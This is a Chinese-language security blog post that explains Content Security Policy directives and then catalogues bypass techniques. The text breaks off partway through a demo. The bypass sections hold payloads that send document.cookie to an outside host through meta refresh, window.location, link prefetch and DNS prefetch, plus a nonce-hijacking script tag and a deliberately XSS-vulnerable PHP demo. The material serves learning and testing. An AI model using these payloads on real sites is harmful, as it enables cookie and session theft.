<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.8.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="何为CSPCSP（Content Security Policy）即内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。 CSP的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。 CSP语法CSP中常见的h">
<meta name="keywords" content="Web安全,XSS">
<meta property="og:type" content="article">
<meta property="og:title" content="CSP策略及绕过技巧小结">
<meta property="og:url" content="https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/index.html">
<meta property="og:site_name" content="Mi1k7ea">
<meta property="og:description" content="何为CSPCSP（Content Security Policy）即内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。 CSP的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。 CSP语法CSP中常见的h">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2019-02-24T15:24:55.592Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CSP策略及绕过技巧小结">
<meta name="twitter:description" content="何为CSPCSP（Content Security Policy）即内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。 CSP的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。 CSP语法CSP中常见的h">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>CSP策略及绕过技巧小结</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">門面</a></li>
         
          <li><a href="/archives/">歸檔</a></li>
         
          <li><a href="/categories/">目錄</a></li>
         
          <li><a href="/tags/">標籤</a></li>
         
          <li><a href="/about/">吾</a></li>
         
          <li><a href="https://blog.csdn.net/ski_12/">舊文</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/2019/02/21/一道绕过CSP的XSS题目/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回頂部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&text=CSP策略及绕过技巧小结"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&title=CSP策略及绕过技巧小结"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&is_video=false&description=CSP策略及绕过技巧小结"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CSP策略及绕过技巧小结&body=Check out this article: https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&title=CSP策略及绕过技巧小结"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&title=CSP策略及绕过技巧小结"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&title=CSP策略及绕过技巧小结"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&title=CSP策略及绕过技巧小结"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/&name=CSP策略及绕过技巧小结&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#何为CSP"><span class="toc-number">1.</span> <span class="toc-text">何为CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP语法"><span class="toc-number">2.</span> <span class="toc-text">CSP语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#策略指令"><span class="toc-number">2.1.</span> <span class="toc-text">策略指令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#default-src"><span class="toc-number">2.1.1.</span> <span class="toc-text">default-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#script-src"><span class="toc-number">2.1.2.</span> <span class="toc-text">script-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#style-src"><span class="toc-number">2.1.3.</span> <span class="toc-text">style-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#img-src"><span class="toc-number">2.1.4.</span> <span class="toc-text">img-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-src"><span class="toc-number">2.1.5.</span> <span class="toc-text">font-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#connect-src"><span class="toc-number">2.1.6.</span> <span class="toc-text">connect-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#child-src"><span class="toc-number">2.1.7.</span> <span class="toc-text">child-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#manifest-src"><span class="toc-number">2.1.8.</span> <span class="toc-text">manifest-src</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内容源"><span class="toc-number">2.2.</span> <span class="toc-text">内容源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#源列表"><span class="toc-number">2.2.1.</span> <span class="toc-text">源列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#关键字"><span class="toc-number">2.2.2.</span> <span class="toc-text">关键字</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CSP策略及绕过技巧小结
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
        <span itemprop="name">Mi1k7ea</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-02-24T05:47:07.000Z" itemprop="datePublished">2019-02-24</time>
        
      
    </div>


      
    <div class="article-tag">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/Web安全基础/">Web安全基础</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/Web安全/">Web安全</a>, <a class="tag-link" href="/tags/XSS/">XSS</a>
    </div>
    <div class="article-tag">
        <i class="fas fa-eye"></i>
        阅读量：<span id="busuanzi_value_page_pv"></span>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="何为CSP"><a href="#何为CSP" class="headerlink" title="何为CSP"></a>何为CSP</h2><p>CSP（Content Security Policy）即内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。</p>
<p>CSP的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。</p>
<h2 id="CSP语法"><a href="#CSP语法" class="headerlink" title="CSP语法"></a>CSP语法</h2><p>CSP中常见的header字段为Content-Security-Policy。</p>
<p>一个CSP头由多组CSP策略组成，中间由分号分隔，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos; www.baidu.com; script-src &apos;unsafe-inline&apos;</span><br></pre></td></tr></table></figure>
<p>其中每一组策略包含一个策略指令和一个内容源列表。</p>
<h3 id="策略指令"><a href="#策略指令" class="headerlink" title="策略指令"></a>策略指令</h3><h4 id="default-src"><a href="#default-src" class="headerlink" title="default-src"></a>default-src</h4><p>default-src作为所有其他指令的备用，一般来说default-src ‘none’; script-src ‘self’这样的情况就会是script-src遵循self，其他的都会使用none。也就是说，除了被设置的指令以外，其余指令都会被设置为default-src指令所设置的属性。</p>
<h4 id="script-src"><a href="#script-src" class="headerlink" title="script-src"></a>script-src</h4><p>script-src指令限制了所有js脚本可以被执行的地方，包括通过链接方式加载的脚本url以及所有内联脚本，甚至包括各种方式的引用。其中还有一个很重要的参数叫’unsafe-inline’，如果加上这个参数，就不会阻止内联脚本，但这被认为是不安全的。</p>
<p>对于这个属性有个特殊的配置叫unsafe-eval，它会允许下面几个函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`eval()Function()setTimeout() with an initial argument which is not callable.setInterval() with an initial argument which is not callable.`</span><br></pre></td></tr></table></figure>
<h4 id="style-src"><a href="#style-src" class="headerlink" title="style-src"></a>style-src</h4><p>style-src定义了页面中CSS样式的有效来源，包括下面三种引用的css属性，style也有个‘unsafe-inline’这个参数，同理会允许所有的内联css。</p>
<p>1、第一种是通过link标签加载的css，类似于<code>&lt;link href=&quot;001.css&quot; type=&quot;text/css&quot; rel=&quot;Stylesheet&quot;/&gt;</code></p>
<p>2、当然还有style标签</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line"><span class="selector-class">.main</span>&#123; <span class="attribute">width</span>:<span class="number">1002px</span>; <span class="attribute">margin</span>:<span class="number">0</span> auto;&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
<p>3、还有通过@import引入的样式表</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt; STYLE TYPE="text/css"&gt; </span><br><span class="line">@<span class="keyword">import</span> <span class="string">"example.css"</span>; </span><br><span class="line">@<span class="keyword">import</span> <span class="string">"style/other.css"</span>; </span><br><span class="line">&lt; /STYLE&gt;</span><br></pre></td></tr></table></figure>
<p>4、内联样式表，类似于<code>style=&quot;font-size:10px;font-color:#ff0000&quot;</code></p>
<h4 id="img-src"><a href="#img-src" class="headerlink" title="img-src"></a>img-src</h4><p>img-src定义了页面中图片和图标的有效来源。</p>
<h4 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h4><p>font-src定义了字体加载的有效来源。</p>
<h4 id="connect-src"><a href="#connect-src" class="headerlink" title="connect-src"></a>connect-src</h4><p>connect-src定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。如下例子：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="tag">&lt;<span class="name">a</span> <span class="attr">ping</span>=<span class="string">"https://not-example.com"</span>&gt;</span>...<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">  var xhr = new XMLHttpRequest();  xhr.open('GET', 'https://not-example.com/');  xhr.send();  var ws = new WebSocket("https://not-example.com/");          var es = new EventSource("https://not-example.com/");  navigator.sendBeacon("https://not-example.com/", &#123; ... &#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>`</span><br></pre></td></tr></table></figure>
<h4 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h4><p>child-src 指定定义了 web workers 以及嵌套的浏览上下文（如\<frame>和\<iframe>）的源。</iframe></p>
<p>会匹配iframe和frame标签，如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先设置csp</span><br><span class="line">Content-Security-Policy: child-src https://example.com/</span><br><span class="line">而下面的请求会被CSP拦截</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"https://not-example.com"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  var blockedWorker = new Worker("data:application/javascript,...");</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="manifest-src"><a href="#manifest-src" class="headerlink" title="manifest-src"></a>manifest-src</h4><p>manifest-src指令限制了从应用清单可以加载的url。</p>
<p>这个属性不太熟，比较常见的就是link：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">举个例子：</span><br><span class="line">Content-Security-Policy: manifest-src https://example.com/</span><br><span class="line">下面的请求会返回错误:</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"manifest"</span> <span class="attr">href</span>=<span class="string">"https://not-example.com/manifest"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="内容源"><a href="#内容源" class="headerlink" title="内容源"></a>内容源</h3><p>内容源有三种：源列表、关键字和数据。</p>
<h4 id="源列表"><a href="#源列表" class="headerlink" title="源列表"></a>源列表</h4><p>源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。站点地址可以包含可选的通配符前缀 (星号, ‘*‘)，端口号也可以使用通配符 (同样是 ‘*‘) 来表明所有合法端口都是有效来源。主机通过空格分隔。</p>
<p> 有效的主机表达式包括：</p>
<p> http://*<a href="http://.foo.com" target="_blank" rel="noopener">.foo.com</a> （匹配所有使用 http协议加载 <a href="http://foo.com" target="_blank" rel="noopener">foo.com</a> 任何子域名的尝试。）</p>
<p> mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。）</p>
<p> <a href="https://store.foo.com" target="_blank" rel="noopener">https://store.foo.com</a> （匹配所有使用 https协议访问 <a href="http://store.foo.com" target="_blank" rel="noopener">store.foo.com</a> 的尝试。）</p>
<p> 如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。</p>
<h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><ul>
<li><strong>‘none’</strong><br>代表空集；即不匹配任何 URL。两侧单引号是必须的。</li>
<li><strong>‘self’</strong><br>代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。</li>
<li><strong>‘unsafe-inline’</strong><br>允许使用内联资源，如内联的\<script>元素、javascript: URL、内联的事件处理函数和内联的\<style>元素，两侧单引号是必须的。</li>
<li><strong>‘unsafe-eval’</strong><br>允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。</li>
</ul>
<h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><p> <strong>data:</strong><br> 允许data: URI作为内容来源。</p>
<p><strong>mediastream:</strong><br> 允许mediastream: URI作为内容来源。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; img-src &apos;self&apos; data:; media-src mediastream:</span><br></pre></td></tr></table></figure>
<h2 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h2><p>绕过场景其实是很多的，这里慢慢来收集吧，主要是先收集一些广泛公开的和CTF中遇到的吧。</p>
<h3 id="1、绕过default-src-‘none’"><a href="#1、绕过default-src-‘none’" class="headerlink" title="1、绕过default-src ‘none’"></a>1、绕过default-src ‘none’</h3><p>策略为：Content-Security-Policy: default-src ‘none’; </p>
<p>这种情况下，可以使用meta标签实现跳转：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=https://www.mi1k7ea.com/x.php?c=[cookie]"</span> &gt;</span></span><br></pre></td></tr></table></figure>
<p>Demo如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$nonce = md5(openssl_random_pseudo_bytes(16));</span><br><span class="line">	header(&quot;Content-Security-Policy: default-src &apos;none&apos;; &quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP Test&lt;/h2&gt;</span><br><span class="line">&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;</span><br><span class="line">	&lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	if (isset($_POST[&apos;content&apos;])) &#123;</span><br><span class="line">		echo &quot;Your POST content: &lt;p&gt;&quot;.@$_POST[&apos;content&apos;].&quot;&lt;/p&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>当我们输入<code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://192.168.43.201:8000/x.php?c=mi1k7ea&quot; &gt;</code>可以成功跳转至目标页面，当然也可以将cookie带出来：</p>
<p><img src="CSP策略及绕过技巧小结/3.png" alt=""></p>
<h3 id="2、形同虚设的script-src-‘unsafe-inline’"><a href="#2、形同虚设的script-src-‘unsafe-inline’" class="headerlink" title="2、形同虚设的script-src ‘unsafe-inline’"></a>2、形同虚设的script-src ‘unsafe-inline’</h3><p>策略中有一条为：script-src ‘unsafe-inline’; ，这条策略相当于直接让CSP几乎沦陷了大半。</p>
<p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">window.location="https://www.mi1k7ea.com/x.php?c=[cookie]";</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">window.open('//www.mi1k7ea.com/?'+escape(document.cookie))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">window.location.href='https://www.mi1k7ea.com/?cookie='+document.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Demo代码还是之前的，把CSP修改一下，添加script-src ‘unsafe-inline’;即可。</p>
<p>输入<code>&lt;script&gt;window.location.href=&#39;http://192.168.43.201:8000/?cookie=&#39;+document.cookie&lt;/script&gt;</code>直接跳转并成功返回cookie：</p>
<p><img src="CSP策略及绕过技巧小结/4.png" alt=""></p>
<p>内嵌script都可以执行，当然可以直接执行本页面的JS，如输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>即可，这里的利用和XSS利用一致，没有啥绕过技巧，不再累赘。</p>
<h3 id="3、绕过xx-src"><a href="#3、绕过xx-src" class="headerlink" title="3、绕过xx-src *"></a>3、绕过xx-src *</h3><p>*号即允许匹配任何URL请求。但一般情况很少会遇到default-src <em>;或大部分xx-src </em>;这样的CSP策略，举一个简单的例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;; connect-src &apos;self&apos;; frame-src *; script-src http://xxxxx/js/ &apos;nonce-xxx&apos;;font-src http://xxxx/fonts/ fonts.gstatic.com; style-src &apos;self&apos; &apos;unsafe-inline&apos;; img-src &apos;self&apos;</span><br></pre></td></tr></table></figure>
<p>很明显地可以找到，frame-src *，其对于iframe的来源并没有做任何限制，当然实际环境可能需要iframe标签来内联来包含别的页面。</p>
<p>可以利用CSRF漏洞。这里直接输入<code>&lt;iframe src=&quot;https://www.mi1k7ea.com&quot;&gt;&lt;/iframe&gt;</code>来测试：</p>
<p> <img src="CSP策略及绕过技巧小结/5.png" alt=""></p>
<p>当然，iframe也可以内嵌外部弹框的JS：</p>
<p><img src="CSP策略及绕过技巧小结/6.png" alt=""></p>
<p>查看页面元素，可以看到iframe内嵌包含进来的是<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，其可以正常执行而无视掉<code>script-src http://xxxxx/js/ &#39;nonce-xxx&#39;;</code>的CSP策略。</p>
<h3 id="4、利用link绕过xx-src-self"><a href="#4、利用link绕过xx-src-self" class="headerlink" title="4、利用link绕过xx-src self"></a>4、利用link绕过xx-src self</h3><p>CSP策略中xx-src self的设置能够使大部分的XSS和CSRF都会失效，但\<link>标签的预加载功能可以进行绕过。</p>
<p>在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"https://www.mi1k7ea.com/c.php?c=[cookie]"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在Firefox下，可以将cookie作为子域名，用DNS预解析的方式把cookie带出去，查看DNS服务器的日志就能得到cookie：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//[cookie].mi1k7ea.com"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在后面的iframe中会有结合利用的示例。</p>
<h3 id="5、利用浏览器补全绕过script-nonce"><a href="#5、利用浏览器补全绕过script-nonce" class="headerlink" title="5、利用浏览器补全绕过script nonce"></a>5、利用浏览器补全绕过script nonce</h3><p>有时候CSP策略可能会设置成如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;;script-src &apos;nonce-xxx&apos;</span><br></pre></td></tr></table></figure>
<p>这种情况下，script标签需要带上正确的nonce属性值才能执行JS代码。</p>
<p>如果，出现了脚本插入点在含有nonce属性值的script标签前面的情况时，如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>插入点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">"aa"</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="undefined">document.write('CSP');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以插入如下内容来利用浏览器补全功能：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.248.1/a.js"</span> <span class="attr">a</span>=<span class="string">"</span></span></span><br></pre></td></tr></table></figure>
<p>最终形成如下页面结构：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.248.1/a.js"</span> <span class="attr">a</span>=<span class="string">"&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;script id="</span><span class="attr">aa</span>" <span class="attr">nonce</span>=<span class="string">"xxx"</span>&gt;</span><span class="undefined">document.write('CSP');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>也就是说，利用浏览器补全的功能，在含有nonce的script标签前面的插入点插入script标签的同时，插入a=”以闭合后面script标签的第一个属性的双引号，从而使中间的内容失效，将本来的nonce属性劫持到了插入的script标签中，使得该插入标签可以正常执行JS代码，也就是说浏览器会给我们自动补全只有一个双引号的属性的值。</p>
<p>还有一个注意点，上述的a标签在Chrome上是执行不了的，原因在于Chrome对于标签的解析方式则不同，Chrome中解析script标签的优先级高于解析属性双引号内的值，因而前面双引号闭合的时候没法正常使其失效。但是这里可以使用src属性替代，使其可在Chrome下正常执行。</p>
<p><strong>Demo</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$nonce = md5(openssl_random_pseudo_bytes(16));</span><br><span class="line">	header(&quot;Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;nonce-$nonce&apos;; &quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP Test&lt;/h2&gt;</span><br><span class="line">&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;</span><br><span class="line">	